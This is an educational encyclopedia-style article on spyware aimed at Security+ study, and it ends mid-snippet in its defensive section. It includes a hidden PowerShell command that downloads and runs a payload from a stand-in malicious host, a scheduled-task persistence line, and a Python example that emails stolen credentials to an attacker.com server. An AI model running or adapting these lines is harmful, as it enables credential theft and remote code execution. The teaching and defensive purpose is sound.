---
domain: "cybersecurity/attack"
tags: [spyware, malware, surveillance, data-exfiltration, privacy, endpoint-security]
---
# Spyware

**Spyware** is a category of [[malware]] designed to covertly collect information about a victim's activities, credentials, and system data without their knowledge or consent, typically transmitting that data to a remote attacker. Unlike [[ransomware]] or [[destructive malware]], spyware prioritizes stealth and persistence over immediate disruption, often operating silently for extended periods. Modern spyware ranges from commercially sold **stalkerware** targeting individuals to sophisticated **nation-state implants** such as the Pegasus platform used against journalists and dissidents.

---

## Overview

Spyware occupies a broad niche in the malware ecosystem, encompassing any software that monitors, records, and exfiltrates user activity or system information without informed consent. The motivations behind spyware deployment are equally varied: cybercriminals deploy it to harvest banking credentials and credit card numbers; corporate espionage actors use it to steal intellectual property; nation-states leverage it to monitor dissidents, journalists, and foreign officials; and in some cases, commercially available "parental control" or employee monitoring tools blur the legal line into stalkerware.

The history of spyware stretches back to the late 1990s when the term was coined in a 1995 Usenet post and popularized by security researchers in the early 2000s. Early spyware was largely bundled with adware and freeware, collecting browsing habits for advertising networks. Tools like CoolWebSearch and Gator (GAIN) infected millions of Windows XP machines through drive-by downloads and software bundles. The commercial anti-spyware market exploded in response, with Microsoft eventually acquiring GIANT AntiSpyware and integrating it into Windows Defender.

Contemporary spyware has evolved dramatically in sophistication. **Commercial surveillance software** (CSS) such as the NSO Group's Pegasus operates using zero-click exploits — vulnerabilities that require no user interaction — targeting iOS and Android devices via iMessage, WhatsApp, and SMS. Pegasus was confirmed by Amnesty International's forensic analysis to have compromised devices belonging to over 50,000 targets globally. At the commodity level, **Remote Access Trojans (RATs)** like Agent Tesla, NanoCore, and AsyncRAT ship with keylogging, screenshot capture, clipboard monitoring, and webcam access modules baked in, sold openly on underground forums for as little as $50.

The persistence and stealth of spyware distinguish it from other malware categories. Spyware operators invest heavily in **anti-forensics** — disabling event logging, injecting into legitimate processes, using encrypted command-and-control (C2) channels over standard ports, and leveraging legitimate cloud services (Google Drive, Dropbox, Pastebin) as dead-drop exfiltration endpoints to blend with normal traffic. Detection is correspondingly difficult, often requiring memory forensics, network traffic analysis, or endpoint detection and response (EDR) telemetry rather than simple signature-based scanning.

---

## How It Works

Spyware infection and operation follows a recognizable lifecycle, though specific implementations vary widely.

### 1. Initial Access (Delivery)

Spyware reaches a target through multiple vectors:

- **Phishing emails** with malicious attachments (`.docm`, `.xlsm`, `.pdf` exploiting Acrobat CVEs) or links to drive-by download pages.
- **Trojanized software** bundled with legitimate installers — a pirated copy of a productivity app shipping with a hidden keylogger alongside the real application.
- **Watering hole attacks** — compromising websites frequented by target demographics to serve browser exploits.
- **Zero-click exploits** — used by Pegasus via a malformed GIF in iMessage (FORCEDENTRY, CVE-2021-30860) that triggered a JBIG2 decoder integer overflow without any user tap or click.
- **Physical access** — commercial stalkerware like FlexiSpy is installed directly onto an unlocked device in minutes.

### 2. Execution and Privilege Escalation

Once delivered, the spyware dropper executes. It may:

```powershell
# Example: Living-off-the-land dropper using PowerShell (Agent Tesla delivery technique)
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command \
  "IEX (New-Object Net.WebClient).DownloadString('http://malicious.example/payload.ps1')"
```

The payload often attempts privilege escalation to gain persistent access. On Windows, common techniques include:
- UAC bypass via `fodhelper.exe` or `eventvwr.exe` COM object hijacking
- Token impersonation via `SeImpersonatePrivilege`
- Kernel exploits (e.g., PrintNightmare, CVE-2021-34527) for SYSTEM-level access

On mobile platforms, root/jailbreak exploits grant spyware access to the entire filesystem and keychain.

### 3. Persistence

Spyware must survive reboots. Established persistence mechanisms include:

```
# Windows Registry Run Key (classic, detectable)
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
Value: "UpdateService" = "C:\Users\victim\AppData\Roaming\svchost32.exe"

# Scheduled Task (stealthier)
schtasks /create /tn "WindowsUpdateHelper" /tr "C:\ProgramData\update.exe" /sc MINUTE /mo 15 /ru SYSTEM

# WMI Event Subscription (fileless, very stealthy)
# Triggers on system events; payload lives only in WMI repository
```

On macOS/Linux, LaunchAgents, cron jobs, and systemd service units serve the same purpose.

### 4. Data Collection Modules

Modern spyware implements modular collection capabilities:

| Module | Function | Technical Method |
|---|---|---|
| **Keylogger** | Records all keystrokes | Windows `SetWindowsHookEx(WH_KEYBOARD_LL)` API hook |
| **Screenshot capture** | Periodic desktop images | `BitBlt` / `GDI+`; sent as JPEG over HTTPS |
| **Credential harvester** | Extracts saved passwords | Browser SQLite DBs, Windows DPAPI decryption |
| **Clipboard monitor** | Intercepts copy-paste data | `AddClipboardFormatListener` Win32 API |
| **Webcam/mic capture** | Live surveillance | DirectShow API / AVFoundation (macOS) |
| **Form grabber** | Intercepts form submissions | Browser process injection, SSL stripping hooks |

### 5. Exfiltration and C2 Communication

Collected data is packaged and exfiltrated to attacker-controlled infrastructure:

- **HTTPS over port 443** — C2 traffic disguised as normal web traffic; TLS certificate may be self-signed or use Let's Encrypt
- **SMTP exfiltration** — Agent Tesla famously uses SMTP (port 587 with STARTTLS) to email stolen credentials directly to attacker inboxes
- **Telegram Bot API** — increasingly popular C2 channel, blending with legitimate Telegram traffic
- **DNS tunneling** — encoding exfiltrated data in DNS TXT queries to bypass egress firewalls

```python
# Simplified concept: Agent Tesla-style SMTP exfiltration
import smtplib
from email.mime.text import MIMEText

def exfil_credentials(stolen_data):
    msg = MIMEText(stolen_data)
    msg['Subject'] = 'LOG ' + hostname
    msg['From'] = 'bot@attacker.com'
    msg['To'] = 'collector@attacker.com'
    
    with smtplib.SMTP('mail.attacker.com', 587) as server:
        server.starttls()
        server.login('bot@attacker.com', 'password')
        server.send_message(msg)
```

---

## Key Concepts

- **Keylogger**: Hardware or software mechanism that records keystrokes as they are typed, capturing passwords, messages, and search queries. Software keyloggers hook into OS input APIs; hardware keyloggers sit between keyboard and USB port.
- **Stalkerware**: Commercially sold spyware (e.g., FlexiSpy, mSpy, Cerberus) marketed as "parental controls" or "employee monitoring" but frequently deployed covertly by abusive partners; a recognized form of technology-facilitated intimate partner abuse.
- **Zero-Click Exploit**: A vulnerability that allows an attacker to compromise a device with no interaction required from the target, as exploited by Pegasus via FORCEDENTRY (CVE-2021-30860) and earlier BlastDoor bypass techniques.
- **Command and Control (C2)**: The infrastructure through which an attacker issues instructions to infected hosts and receives exfiltrated data; spyware C2 is increasingly hosted on legitimate cloud platforms or uses domain generation algorithms (DGAs) to evade blocking.
- **Browser Credential Harvesting**: Technique where spyware reads stored credentials from browser profile directories (e.g., `%APPDATA%\Local\Google\Chrome\User Data\Default\Login Data`) — a SQLite database encrypted with Windows DPAPI, which the running user process can decrypt without admin rights.
- **Process Injection**: Technique of inserting malicious code into the address space of a legitimate running process (e.g., `explorer.exe`, `svchost.exe`) to hide the spyware's execution and evade process-based detection.
- **Living Off the Land (LotL)**: Spyware that uses built-in system tools (PowerShell, WMI, certutil, curl) rather than custom executables, reducing its detectable footprint and bypassing signature-based AV.

---

## Exam Relevance

**Security+ SY0-701** covers spyware under **Domain 2: Threats, Vulnerabilities, and Mitigations** (objective 2.4 — analyzing indicators of malicious activity).

**Key exam points:**

- The exam distinguishes spyware from **adware** (adware displays unwanted ads; spyware covertly transmits data). Questions may present a scenario and ask you to classify the malware type — look for keywords like "transmits user data without consent" or "records keystrokes" to identify spyware.
- **Keyloggers** are sometimes tested as a standalone topic but are correctly classified as a subtype or component of spyware on the exam. Know that they can be both hardware and software implementations.
- Understand that **cookies** used for tracking are a form of privacy violation often associated with spyware in exam questions, though they are technically distinct from true spyware.
- The **Pegasus** and **FORCEDENTRY** scenario represents the class of "zero-click" attacks — exam scenarios may describe an attack where a device was compromised without the user clicking anything, pointing to spyware delivered via zero-click exploitation.
- **Stalkerware** may appear in questions about **insider threats** or **social engineering** contexts — it bridges cybersecurity and physical/interpersonal threat models.
- Common gotcha: the exam may present monitoring software installed by an employer on company-owned devices as legitimate (with policy disclosure) versus the same software installed covertly as spyware. The **consent and disclosure** element is the distinguishing factor.
- Know defensive tools: **anti-malware software**, **EDR solutions**, **network traffic monitoring**, and **application whitelisting** are all valid controls; the exam expects you to match control type (technical/administrative/physical) to threat.

---

## Security Implications

### Vulnerabilities Exploited

Spyware leverages a wide range of vulnerability classes:

- **CVE-2021-30860 (FORCEDENTRY)**: Integer overflow in Apple's CoreGraphics JBIG2 image parser, used by NSO Group's Pegasus for zero-click iOS compromise. Disclosed by Citizen Lab and Amnesty International in September 2021; patched in iOS 14.8.
- **CVE-2017-0199**: Microsoft Office OLE2 remote code execution used extensively by commodity spyware like Dridex and FormBook for initial access via malicious RTF/DOCX files.
- **CVE-2021-34527 (PrintNightmare)**: Windows Print Spooler RCE used post-infection for privilege escalation to SYSTEM, enabling spyware to operate without user-context limitations.
- **Browser SQLite credential stores**: Not a CVE, but a design weakness — Chrome, Edge, and Firefox store credentials in predictable locations decryptable by any process running as the current user, requiring only user-level code execution to harvest.

### Notable Incidents

- **Operation Triangulation (2023)**: Kaspersky researchers discovered an iOS spyware campaign (TriangleDB) using zero-click iMessage exploits including CVE-2023-32434, targeting researchers' own devices. Attributed to an unknown sophisticated threat actor.
- **Hermit Spyware (2022)**: Commercial spyware developed by Italian firm RCS Lab, deployed against targets in Italy and Kazakhstan by government operators, delivered via fake carrier update links following intentional ISP-level service disruption to targets' devices.
- **FinFisher/FinSpy**: German-UK surveillance firm Gamma Group's product, found deployed against activists in Bahrain, Ethiopia, and UAE; used DLL side-loading and bootkit techniques for persistence.
- **Agent Tesla in phishing campaigns (2020-present)**: Consistently one of the top five most prevalent malware families in phishing data; specifically targets corporate email credentials via SMTP exfiltration, with thousands of active campaigns daily.

### Indicators of Compromise (IoCs)

- Unexpected outbound connections on ports 25, 465, 587 (SMTP) or 443 to cloud providers not in the org's known baseline
- Registry `Run` keys or scheduled tasks pointing to files in `%AppData%`, `%Temp%`, or `%ProgramData%`
- Processes injecting into `explorer.exe` or `lsass.exe` (detectable via EDR memory telemetry)
- Large volumes of DNS TXT queries to unusual domains (DNS tunneling)
- `powershell.exe` with `-EncodedCommand` or `-WindowStyle Hidden` flags in process creation logs

---

## Defensive Measures

### Endpoint Controls

1. **Deploy an EDR solution** (e.g., CrowdStrike Falcon, Microsoft Defender for Endpoint, SentinelOne) — EDR provides behavioral detection that catches spyware through abnormal API call patterns, process injection, and suspicious network connections that bypass signature-based AV.

2. **Enable Windows Defender Credential Guard** — isolates the LSASS process in a Hyper-V protected container, preventing credential extraction by user-mode spyware.

3. **Application Whitelisting** via Microsoft AppLocker or Windows Defender Application Control (WDAC):
   ```
   # Example AppLocker rule: block execution from %AppData%
   # GPO: Computer Configuration > Windows Settings > Security Settings > Application Control Policies > AppLocker
   # Deny rule: %APPDATA%\* for all users (executable rules)
   ```

4. **Disable or restrict PowerShell for non-administrators**:
   ```powershell
   # Constrained Language Mode via GPO or WDAC
   # Blocks most LotL PowerShell-based delivery
   Set-ExecutionPolicy -ExecutionPolicy Restricted -Scope LocalMachine
   ```

5. **Patch aggressively** — the majority of commodity spyware exploits vulnerabilities with available patches. Prioritize browser, Office, and OS patches; use CVSS scoring with CISA KEV catalog for prioritization.

### Network Controls

6. **Egress filtering** — block outbound SMTP (ports 25, 465, 587) from workstations; only allow mail servers to originate SMTP. This directly blocks Agent Tesla-style credential exfiltration.

7. **DNS filtering** with a service like Cisco Umbrella, Cloudflare Gateway, or Pi-hole with threat feeds — blocks known C2 domains and flags DGA-generated domains by their lexical entropy.

8. **TLS inspection** (SSL/TLS decryption) on perimeter firewalls — allows IDS/IPS to inspect encrypted C2 traffic; must be deployed with privacy policy awareness.

9. **Network traffic baseline analysis** — use tools like Zeek (Bro) to establish normal outbound traffic patterns and alert on anomalies:
   ```
   # Zeek: alert on SMTP from non-mail servers
   # In /usr/local/zeek/share/zeek/site/local.zeek
   @load policy